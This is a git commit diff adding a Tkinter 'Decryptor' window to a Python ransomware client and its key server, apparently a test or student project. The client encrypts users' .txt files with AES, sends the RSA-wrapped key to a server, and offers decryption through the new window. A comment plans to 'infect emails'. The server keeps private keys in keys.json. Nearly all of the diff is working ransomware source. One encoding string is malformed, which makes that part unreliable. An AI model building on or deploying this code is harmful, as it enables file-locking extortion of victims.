a89e1c22e60e130c685355c841563571b327a7a6
MahmoudJobeel <mahmoudjobeel@gmail.com>
2023-05-28 05:25:54 +0300

    Adding GUI

--- client.py
+++ client.py
@@ -5,12 +5,16 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Util.Padding import pad, unpad
 import base64
+import tkinter as tk
+import pyperclip
 
 import socket
 
 # Constants
 BLOCK_SIZE = 32  # Bytes
 USERNAME = os.getlogin()  # Fetch USERNAME
+test_folder_path = "C:\\Users\\lenovo\\Downloads\\Documents"
+public_key_test_path = "C:\\Users\\lenovo\\Downloads\\Public_Keys"
 
 
 # Encryption / Decryption Helper Functions
@@ -31,10 +35,6 @@ def encrypt_aes(file_name, aes_key):
     file.write(ciphertext)
     file.close()
 
-    file = open(file_name + '.COPY', mode='wb')
-    file.write(ciphertext)
-    file.close()
-
 
 def decrypt_aes(file_name, aes_key):
     file = open(file_name, mode='rb')
@@ -44,7 +44,7 @@ def decrypt_aes(file_name, aes_key):
     cipher = AES.new(aes_key, AES.MODE_ECB)
     plaintext = cipher.decrypt(ciphertext)
     plaintext = unpad(plaintext, BLOCK_SIZE)
-    plaintext = plaintext.decode('UTF-8')
+    plaintext = plaintext.decode('`latin-1`')
 
     file = open(file_name, mode='w')
     file.write(plaintext)
@@ -63,8 +63,10 @@ def encrypt_rsa(a_message, key):
 # Encrypting / Decrypting Files
 def encrypt_files(aes_key):
     print("Encrypted Files:")
-    directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
+    # directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
+    directory = os.fsencode(test_folder_path)
     _encrypt_files(aes_key, directory)
+
 
 def _encrypt_files(aes_key, root_directory):
     for file in os.listdir(root_directory):
@@ -74,14 +76,17 @@ def _encrypt_files(aes_key, root_directory):
         else:
             filename = os.fsdecode(file)
             if filename.endswith(".txt"):
-                file_full_path = os.path.join(root_directory.decode('UTF-8'), filename)
+                file_full_path = os.path.join(root_directory.decode('latin-1'), filename)
                 print(file_full_path)
                 encrypt_aes(file_full_path, aes_key)
 
+
 def decrypt_files(aes_key):
     print("Decrypted Files:")
-    directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
+    # directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
+    directory = os.fsencode(test_folder_path)
     _decrypt_files(aes_key, directory)
+
 
 def _decrypt_files(aes_key, root_directory):
     for file in os.listdir(root_directory):
@@ -91,26 +96,28 @@ def _decrypt_files(aes_key, root_directory):
         else:
             filename = os.fsdecode(file)
             if filename.endswith(".txt"):
-                file_full_path = os.path.join(root_directory.decode('UTF-8'), filename)
+                file_full_path = os.path.join(root_directory.decode('latin-1'), filename)
                 print(file_full_path)
                 decrypt_aes(file_full_path, aes_key)
 
 
 # Saving / Loading Public Key
 def store_public_key_on_desktop(public_key):
-    file = open(
-        f'C:\\Users\\{USERNAME}\\Desktop\\PublicKey.key', 'w')
+    # file = open(
+    #     f'C:\\Users\\{USERNAME}\\Desktop\\PublicKey.key', 'w')
+    file = open(public_key_test_path + '\\PublicKey.key', 'w')
     public_key_bytes = public_key.export_key('PEM')
-    public_key_str = public_key_bytes.decode("utf-8")
+    public_key_str = public_key_bytes.decode("latin-1")
     file.write(public_key_str)
     file.close()
 
 
 def read_public_key_from_desktop():
-    file = open(
-        f'C:\\Users\\{USERNAME}\\Desktop\\PublicKey.key', 'r')
+    # file = open(
+    #     f'C:\\Users\\{USERNAME}\\Desktop\\PublicKey.key', 'r')
+    file = open(public_key_test_path + '\\PublicKey.key', 'r')
     public_key_str = file.read()
-    public_key_bytes = public_key_str.encode("utf-8")
+    public_key_bytes = public_key_str.encode("latin-1")
     key = RSA.import_key(public_key_bytes)
     return key
 
@@ -131,39 +138,40 @@ def send_to_server(msg):
 
 
 def generate_public_key():
-    public_key = send_to_server('get_public_key'.encode('UTF-8'))
+    public_key = send_to_server('get_public_key'.encode('latin-1'))
     key = RSA.import_key(public_key)
     print('Received Public Key From Server: ' + str(key))
     return key
 
 
 def send_encrypted_aes_to_server(encrypted_aes_key, public_key):
-    send_to_server('post_encrypted_aes'.encode('UTF-8'.strip()))
+    send_to_server('post_encrypted_aes'.encode('latin-1'.strip()))
     send_to_server(encrypted_aes_key)
     response = send_to_server(public_key.export_key('PEM'))
     print(response)
 
 
 def get_decrypted_aes(public_key):
-    send_to_server('get_decrypted_aes'.encode('UTF-8'))
+    send_to_server('get_decrypted_aes'.encode('latin-1'))
     decrypted_aes_key = send_to_server(public_key.export_key('PEM'))
     print('Received Decrypted AES Key From Server: ' + str(decrypted_aes_key))
     return decrypted_aes_key
 
 
 # Client Endpoints
-def decrypt():
+def decryptor():
     # get stored public key
     public_key = read_public_key_from_desktop()
 
+    print('Public Key: ' + str(public_key))
     # get decrypted aes key from the server
     aes_key = get_decrypted_aes(public_key)
-
+    print('AES Key: ' + str(aes_key))
     # decrypt the files with aes key
     decrypt_files(aes_key)
 
 
-def main():
+def encryptor():
     # generate aes key
     aes_key = generate_aes_key()
 
@@ -185,7 +193,43 @@ def main():
     # TODO: infect emails
 
 
+def show_gui():
+    def submit_public_key():
+        public_key_str = public_key_entry.get()
+        try:
+            public_key = RSA.import_key(public_key_str.encode("latin-1"))
+            aes_key = get_decrypted_aes(public_key)
+            decrypt_files(aes_key)
+            aes_key_label.config(text="Files Decrypted Successfully")
+
+        except (ValueError, IndexError):
+            aes_key_label.config(text="Invalid Public Key")
+
+    window = tk.Tk()
+    window.title("Decryptor")
+    window.geometry("600x400")
+
+    font_size = 14
+
+    public_key_label = tk.Label(window, text="Enter Key to decrypt:", font=("Arial", font_size))
+    public_key_label.pack(pady=10)
+
+    public_key_entry = tk.Entry(window, font=("Arial", font_size))
+    public_key_entry.pack(pady=10)
+
+    submit_button = tk.Button(window, text="Submit", command=submit_public_key, font=("Arial", font_size))
+    submit_button.pack(pady=10)
+
+    aes_key_label = tk.Label(window, text="", font=("Arial", font_size))
+    aes_key_label.pack(pady=10)
+
+    window.mainloop()
+
+
 if __name__ == "__main__":
-    # TODO: CLI
-    main()
-    decrypt()
+    if not os.path.exists(public_key_test_path + '\\PublicKey.key'):
+        # First run: Encryption
+        encryptor()
+    else:
+        # Other runs: GUI
+        show_gui()
--- server.py
+++ server.py
@@ -1,3 +1,4 @@
+import json
 import socket
 
 from Crypto.PublicKey import RSA
@@ -6,6 +7,7 @@ import base64
 
 public_private_keys = {}
 public_rsa_encrypted_aes_keys = {}
+
 
 def generate_public_private_rsa_keys():
     modulus_length = 2048
@@ -29,13 +31,19 @@ def get_public_key():
     private, public = generate_public_private_rsa_keys()
     public_key_bytes = public.export_key('PEM')
     private_key_bytes = private.export_key('PEM')
-    public_private_keys[public_key_bytes] = private
-    
+
+    keys_dict = {
+        public_key_bytes.decode('latin-1'): private_key_bytes.decode('latin-1')
+    }
+
+    with open('keys.json', 'w') as file:
+        json.dump(keys_dict, file)
+
     print("The generated public key:")
     print(public_key_bytes)
     print("The generated private key:")
     print(private_key_bytes)
-    
+
     return public_key_bytes
 
 
@@ -52,7 +60,7 @@ def post_encrypted_aes_request(server_socket, client_socket):
     client_socket.close()
 
     client_socket, addr = server_socket.accept()
-    encrypted_aes_key = client_socket.recv(1024).decode('UTF-8')
+    encrypted_aes_key = client_socket.recv(1024).decode('latin-1')
     print("The encrypted AES key:")
     print(encrypted_aes_key)
     client_socket.close()
@@ -63,8 +71,18 @@ def post_encrypted_aes_request(server_socket, client_socket):
     print(public_key_bytes)
     public_rsa_encrypted_aes_keys[public_key_bytes] = encrypted_aes_key
     client_socket.send(
-        'Encrypted AES Key Saved Successfully In Server'.encode('UTF-8'))
+        'Encrypted AES Key Saved Successfully In Server'.encode('latin-1'))
     client_socket.close()
+
+
+def get_private_key(public_key_bytes):
+    with open('keys.json', 'r') as file:
+        keys_dict = json.load(file)
+
+    private_key = keys_dict[public_key_bytes.decode('latin-1')].encode('latin-1')
+    private_key = RSA.import_key(private_key)
+
+    return private_key
 
 
 def get_decrypted_aes(server_socket, client_socket):
@@ -75,10 +93,11 @@ def get_decrypted_aes(server_socket, client_socket):
     public_key_bytes = client_socket.recv(1024)
     print("Request came from client with public key:")
     print(public_key_bytes)
-    private_key = public_private_keys[public_key_bytes]
+
+    private_key = get_private_key(public_key_bytes)
 
     encrypted_aes_key = public_rsa_encrypted_aes_keys[public_key_bytes].encode(
-        'UTF-8')
+        'latin-1')
     decrypted_aes_key = decrypt_rsa(encrypted_aes_key, private_key)
     print("The decrypted AES key:")
     print(decrypted_aes_key)
@@ -94,15 +113,15 @@ def main():
     SERVER_PORT = 5678
 
     server_socket.bind((SERVER_IP, SERVER_PORT))
-    server_socket.listen(5)
+    server_socket.listen(1)
 
     while True:
         client_socket, addr = server_socket.accept()
 
-        request = client_socket.recv(1024).decode('UTF-8')
+        request = client_socket.recv(1024).decode('latin-1')
         # print(request)
 
-        response = 'No Response'.encode('UTF-8')
+        response = 'No Response'.encode('latin-1')
         if request == 'get_public_key':
             get_public_key_request(server_socket, client_socket)
         elif request == 'post_encrypted_aes':
